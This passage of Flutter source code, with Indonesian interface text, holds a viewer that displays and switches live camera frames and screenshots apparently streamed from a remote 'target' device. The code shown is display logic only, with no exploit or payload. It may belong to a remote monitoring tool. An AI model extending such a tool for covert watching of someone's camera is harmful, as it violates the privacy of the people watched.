    final newFacing = _currentFacing == 'front' ? 'back' : 'front';
    setState(() {
      _currentFacing = newFacing;
      _isLoading = true;
      _currentFrame = '';
      _emptyCount = 0;
    });
    widget.onSwitchCamera(newFacing);

    await Future.delayed(const Duration(milliseconds: 200));
    await _startLiveCamera();
  }

  @override
  Widget build(BuildContext context) {
    final preset = AppTheme.of(context);

    return Scaffold(
      backgroundColor: preset.bg,
      appBar: AppBar(
        backgroundColor: preset.accent2,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios, color: preset.text),
          onPressed: () {
            _stopLiveCamera();
            widget.onClose();
          },
        ),
        title: Text(
          "LIVE CAM - ${_currentFacing.toUpperCase()}",
          style: TextStyle(
              color: preset.text,
              fontWeight: FontWeight.w900,
              letterSpacing: 1.5),
        ),
        actions: [
          IconButton(
            icon: Icon(Icons.switch_camera, color: preset.text),
            onPressed: _switchCamera,
          ),
        ],
      ),
      body: _currentFrame.isEmpty
          ? Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  CircularProgressIndicator(color: preset.accent),
                  const SizedBox(height: 16),
                  Text(
                    "CONNECTING ${_currentFacing.toUpperCase()} CAMERA...",
                    style: TextStyle(
                        color: preset.subText,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 1.5),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    "Pastikan device online & izin kamera aktif",
                    style: TextStyle(
                        color: preset.subText,
                        fontSize: 10,
                        fontWeight: FontWeight.w600),
                  ),
                ],
              ),
            )
          : InteractiveViewer(
              minScale: 0.5,
              maxScale: 3.0,
              child: Image.memory(
                base64Decode(
                    _currentFrame.contains(',')
                        ? _currentFrame.split(',').last
                        : _currentFrame),
                fit: BoxFit.contain,
                width: double.infinity,
                height: double.infinity,
                gaplessPlayback: true,
                errorBuilder: (_, __, ___) => Center(
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.broken_image_outlined,
                          color: preset.subText, size: 48),
                      const SizedBox(height: 12),
                      Text(
                        "Frame rusak, menunggu frame baru...",
                        style: TextStyle(
                            color: preset.subText,
                            fontWeight: FontWeight.w700),
                      ),
                    ],
                  ),
                ),
              ),
            ),
    );
  }
}

class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final preset = AppTheme.of(context);

    return Scaffold(
      backgroundColor: preset.bg,
      appBar: AppBar(
        backgroundColor: preset.accent2,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.close, color: preset.text),
          onPressed: onClose,
        ),
        title: Text("SCREENSHOT ${screenshotFacing.toUpperCase()}",
            style: TextStyle(
                color: preset.text,
                fontWeight: FontWeight.w900,
                letterSpacing: 2)),
      ),
      body: InteractiveViewer(
        child: Image.memory(
          base64Decode(screenshotFrame.split(',').last),
          fit: BoxFit.contain,
          errorBuilder: (_, __, ___) => Center(
            child: Text("Gagal memuat gambar",
                style: TextStyle(
                    color: preset.subText, fontWeight: FontWeight.w700)),
          ),
        ),
      ),
    );
  }
}